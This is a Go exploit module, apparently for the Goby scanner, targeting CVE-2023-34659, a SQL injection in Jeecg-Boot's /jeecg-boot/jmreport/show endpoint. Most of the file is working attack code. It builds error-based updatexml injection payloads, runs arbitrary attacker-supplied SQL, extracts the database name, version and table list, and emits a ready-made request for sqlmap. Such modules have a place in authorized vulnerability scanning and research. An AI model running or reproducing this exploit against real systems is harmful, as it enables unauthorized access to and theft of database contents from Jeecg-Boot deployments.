package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Jeecg-Boot /jeecg-boot/jmreport/show SQL Injection Vulnerability(CVE-2023-34659)",
    "Description": "<p>JeecgBoot is a BPM-based low-code platform.</p><p>jeecg-boot 3.5.0 and 3.5.1 have a SQL injection vulnerability the id parameter of the /jeecg-boot/jmreport/show interface.</p>",
    "Product": "JEECGBOOT-Ent-Low-CP",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2023-05-25",
    "PostTime": "2024-06-24",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(title=\"JeecgBoot 企业级低代码平台\" && body=\"JeecgBoot\") ||  (header=\"Strict-Transport-Security\" && body=\"/signin/static/js\")",
    "GobyQuery": "(title=\"JeecgBoot 企业级低代码平台\" && body=\"JeecgBoot\") ||  (header=\"Strict-Transport-Security\" && body=\"/signin/static/js\")",
    "Level": "2",
    "Impact": "<p>Attackers can access the data in the database without authorization, steal users' privacy and personal information, leak users' information, and even control the server.</p>",
    "Recommendation": "<p>We recommend that you update your current system or software to the latest version to fix the vulnerability.</p>",
    "References": [
        "https://github.com/jeecgboot/JeecgBoot/issues/4976",
        "https://avd.aliyun.com/detail?id=AVD-2023-34659"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "way",
            "type": "select",
            "value": "db_name,db_version,all_tables_of_current_db",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2023-34659"
    ],
    "CNNVD": [
        "CNNVD-202306-1328"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "Jeecg-Boot /jeecg-boot/jmreport/show SQL 注入漏洞（CVE-2023-34659）",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>JeecgBoot是一款基于BPM的低代码平台<br></p><p>jeecg-boot 3.5.0 和 3.5.1 存在 SQL 注入漏洞：/jeecg-boot/jmreport/show 接口的 id 参数。<br></p>",
            "Recommendation": "<p>建议更新当前系统或软件至最新版，完成漏洞的修复。<br></p>",
            "Impact": "<p>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露，乃至控制服务器。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jeecg-Boot /jeecg-boot/jmreport/show SQL Injection Vulnerability(CVE-2023-34659)",
            "Product": "JEECGBOOT-Ent-Low-CP",
            "Description": "<p>JeecgBoot is a BPM-based low-code platform.<br></p><p>jeecg-boot 3.5.0 and 3.5.1 have a SQL injection vulnerability the id parameter of the /jeecg-boot/jmreport/show interface.<br></p>",
            "Recommendation": "<p>We recommend that you update your current system or software to the latest version to fix the vulnerability.<br></p>",
            "Impact": "<p>Attackers can access the data in the database without authorization, steal users' privacy and personal information, leak users' information, and even control the server.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10963"
}`
	setSqlPayloadHash1717551635 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		vulurl = "/jeecg-boot/jmreport/show"
		makeRequest := httpclient.NewPostRequestConfig(vulurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 5
		makeRequest.FollowRedirect = true
		makeRequest.Header.Store("Content-Type", "application/json;charset=UTF-8")
		data := `{"id": "961455b47c0b86dc961e90b5893bff05", "apiUrl": "", "params": "{\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(` + sql + `)),1)) or '%%' like '\"}"}`
		makeRequest.Data = data
		resp, err = httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil {
			return resp, vulurl, err
		}
		if strings.Contains(resp.HeaderString.String(), "text/html") {
			err = fmt.Errorf("fail")
			return resp, vulurl, err
		}
		return resp, vulurl, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "XPATH syntax error"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "select database()"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `(XPATH syntax error)`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHash1717551635
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := `POST http://itsoon.net/jeecg-boot/jmreport/show HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4 rv:6.0; ckb-IQ) AppleWebKit/532.31.7 (KHTML, like Gecko) Version/5.1 Safari/532.31.7
Accept-Encoding: gzip, deflate\nAccept: */*
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 164

{"id": "961455b47c0b86dc961e90b5893bff05", "apiUrl": "", "params": "{\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '\"}"}`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `XPATH syntax error: '([\s\S]*?)';`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHash1717551635
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				sql = strings.Replace(sql, "\"", "'", -1)
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "default" {
				key := goutils.B2S(ss.Params["way"])
				if key == "db_name" {
					key = "database()"
				} else if key == "all_tables_of_current_db" {
					key = "group_concat(table_name)from information_schema.tables where table_schema=database()"
				} else if key == "db_version" {
					key = "version()"
				}
				sql := "select " + key
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
